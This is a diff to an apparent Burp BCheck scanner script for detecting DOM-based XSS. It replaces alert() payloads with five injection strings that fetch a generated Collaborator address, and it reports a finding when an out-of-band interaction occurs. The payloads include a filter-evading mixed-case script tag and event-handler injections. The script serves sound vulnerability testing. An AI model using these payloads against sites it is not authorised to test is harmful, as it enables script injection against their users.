@@ -5,23 +5,24 @@ metadata:
     author: "BCheck Arsenal"
     tags: "xss", "dom", "waf-bypass"
 
+define:
+    collab = {generate_collaborator_address()}
+
 run for each:
-    payload = "javascript:alert(document.domain)",
-        "'-alert(1)-'",
-        "</sCrIpT><sCrIpT>alert(1)</sCrIpT>",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>"
+    payload = "javascript:fetch('http://{collab}')",
+        "'-fetch('http://{collab}')-'",
+        "</sCrIpT><sCrIpT>fetch('http://{collab}')</sCrIpT>",
+        "<img src=x onerror=fetch('http://{collab}')>",
+        "<svg onload=fetch('http://{collab}')>"
 
 given insertion point then
     send payload:
         replacing: {payload}
 
-    if not({latest.response.status_code} is "400") then
-        if {latest.response.body} matches "(innerHTML|document.write|eval[(]|outerHTML|insertAdjacentHTML)" then
-            report issue:
-                severity: medium
-                confidence: tentative
-                detail: "Potential DOM-based XSS detected. The response contains DOM sink patterns that may process user-controlled input."
-                remediation: "Avoid dangerous DOM sinks. Use textContent instead of innerHTML. Sanitize all client-side input."
-        end if
+    if any interactions then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: "DOM-based XSS detected. The payload was processed by a client-side sink and successfully executed an out-of-band request."
+            remediation: "Avoid dangerous DOM sinks. Use textContent instead of innerHTML. Sanitize all client-side input."
     end if
